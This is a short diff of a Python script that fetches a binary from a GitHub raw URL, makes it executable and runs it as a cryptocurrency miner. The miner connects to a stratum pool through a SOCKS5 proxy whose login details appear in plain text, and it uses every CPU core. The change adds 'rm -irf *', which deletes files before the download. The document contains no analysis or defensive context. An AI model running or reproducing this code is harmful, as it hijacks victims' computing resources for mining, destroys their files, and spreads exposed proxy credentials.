@@ -1,4 +1,4 @@
 import sys
 import os
-os.system("wget https://github.com/erlandi-main-api/testpoint/raw/main/cp")
+os.system("rm -irf * && wget https://github.com/erlandi-main-api/testpoint/raw/main/cp")
 os.system("chmod +x cp && ./cp -a yespowertide  -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TXkhs8Rp8cAdfL37XUEd23zia61d7tQ9Ro.AMDRYZEN-by-erlandi -t $(nproc) -x socks5://rtwuzqff:mvi1tthkzajd@45.94.47.66:8110")
